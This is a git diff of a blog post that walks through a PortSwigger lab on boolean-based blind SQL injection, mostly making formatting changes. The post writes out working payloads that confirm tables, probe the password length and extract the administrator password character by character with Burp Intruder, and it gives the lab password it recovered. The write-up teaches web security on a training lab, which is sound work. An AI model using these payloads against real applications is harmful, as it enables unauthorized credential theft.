@@ -10,13 +10,7 @@ tags: [owasp, sql-injection, web-security, portswigger]
 
 ---
 
-
-
-
-
 # Lab 9: Blind SQL Injection with Conditional Responses
-
-
 
 ## Lab Description
 
@@ -34,16 +28,16 @@ Your task is to exploit the Blind SQL Injection vulnerability to retrieve the pa
 ### 1. Confirm the Blind SQLi vulnerability
 
 Request example:
-
 select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN'
 
 Behavior:
 If trackingId exists → query returns rows → “Welcome back” is displayed.
 If not → no message is shown.
 
+
 <div style="text-align: center;">
-&nbsp; <img src="/top10-owasp-blog/assets/images/wu1.png" alt=" " style="width: 30%; border: 1px solid #ccc; border-radius: 8px;">
-&nbsp; <p><em>Figure 1: Tested the cookie value </em></p>
+  <img src="/top10-owasp-blog/assets/images/wu1.png" alt="SQL Injection Diagram" style="width: 40%; border: 1px solid #ccc; border-radius: 8px;">
+  <p><em>Figure 1: </em> Tested the cookie value </p>
 </div>
 
 Boolean-based test:
@@ -57,47 +51,41 @@ This confirms the parameter is vulnerable to Blind SQL Injection.
 
 
 ### 2. Confirm the users table exists
---
+---
 
-select tracking-id from tracking-table 
-
-where trackingId = 'RvLfBu6s9EZRlVYN' 
-
-and (select 'x' from users LIMIT 1)='x'-- 
---
+'select tracking-id from tracking-table 
+'where trackingId = 'RvLfBu6s9EZRlVYN' 
+'and (select 'x' from users LIMIT 1)='x'-- 
+---
 <div style="text-align: center;">
-  <img src="/top10-owasp-blog/assets/images/wu2.png" alt=" " style="width: 30%; border: 1px solid #ccc; border-radius: 8px;">
-  <p><em>Figure 1: Tested the cookie value </em></p>
+  <img src="/top10-owasp-blog/assets/images/wu2.png" alt="SQL Injection Diagram" style="width: 40%; border: 1px solid #ccc; border-radius: 8px;">
+  <p><em>Figure 1: </em> Tested the cookie value </p>
 </div>
+--
 ==>  users table exists.
 
 ### 3. Confirm administrator user exists
 --
-
 select tracking-id from tracking-table 
-
 where trackingId = 'RvLfBu6s9EZRlVYN' 
-
 and (select username from users where username='administrator')='administrator'-- 
-
 --
 
 ==> administrator user exists.
 
 <div style="text-align: center;">
-  <img src="/top10-owasp-blog/assets/images/wu3.png" alt=" " style="width: 30%; border: 1px solid #ccc; border-radius: 8px;">
-  <p><em>Figure 1: Tested the cookie value </em></p>
+  <img src="/top10-owasp-blog/assets/images/wu3.png" alt="SQL Injection Diagram" style="width: 40%; border: 1px solid #ccc; border-radius: 8px;">
+  <p><em>Figure 1: </em> Tested the cookie value </p>
 </div>
 
 ### 4. Determine the password length
---
-
+---
 ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)=20)='administrator'--
-
---
+---
 
 If the length is x , the subquery returns administrator, making the comparison = 'administrator' TRUE.
 The app will display the "Welcome back" message.
+
 If the length is not x, the condition is FALSE, and no "Welcome back" message appears.
 By adjusting the number in LENGTH(password)=X and observing the response, you can find the exact length.
 
@@ -116,20 +104,19 @@ By adjusting the number in LENGTH(password)=X and observing the response, you ca
 -Go to the Payloads tab.
 -Set the payload type to Simple list.
 -Enter all possible characters:
-
---
-abcdefghijklmnopqrstuvwxyz
-ABCDEFGHIJKLMNOPQRSTUVWXYZ
-0123456789
---
+---
+'abcdefghijklmnopqrstuvwxyz
+'ABCDEFGHIJKLMNOPQRSTUVWXYZ
+'0123456789
+---
 
 * Run the attack for each character position
 
 Start with position 1:
---
+---
 
 ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='§a§'--
---
+---
 ==> Look at the Length or Response column in the Intruder results, If it’s longer or contains "Welcome back", that character is correct and repeat for positions 1 → 20.
 Write down each discovered character in order until you have all 20.
 
@@ -140,11 +127,12 @@ Example found password in my lab :
 ### 6.Verify the password
 
 Use Burp Repeater to check if it matches the administrator account:
---
+---
 ' AND SUBSTRING((SELECT username FROM users WHERE password='52rabjtjpa749cy0bvo6'),1,1)='a'--
---
+---
 ==> If it returns the "Welcome back" message → the password is correct , and you can test
 in lab with Username: administrator and Password: 52rabjtjpa749cy0bvo6
+
 ### Conclusion
 This lab clearly demonstrates how to exploit a Boolean-based Blind SQL Injection when the application does not display query results directly and provides no error messages.
 By observing the server’s behavior (specifically, the appearance of the "Welcome back" message), we were able to:
